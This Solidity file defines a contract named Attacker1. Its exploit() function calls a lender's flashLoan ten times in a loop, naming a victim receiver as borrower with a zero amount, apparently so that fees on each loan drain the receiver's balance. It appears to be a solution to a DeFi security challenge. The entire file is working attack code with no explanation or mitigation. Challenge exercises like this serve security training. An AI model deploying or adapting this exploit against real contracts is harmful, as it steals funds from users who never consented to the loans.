//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ILender {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract Attacker1 {
    ILender lender;
    address receiver;

    constructor(address _lender, address _receiver) {
        lender = ILender(_lender);
        receiver = _receiver;
    }

    function exploit() public {
        uint8 i;
        while (i<10) {
            lender.flashLoan(receiver, 0);

            unchecked {
                i++;
            }
        }
    }
}
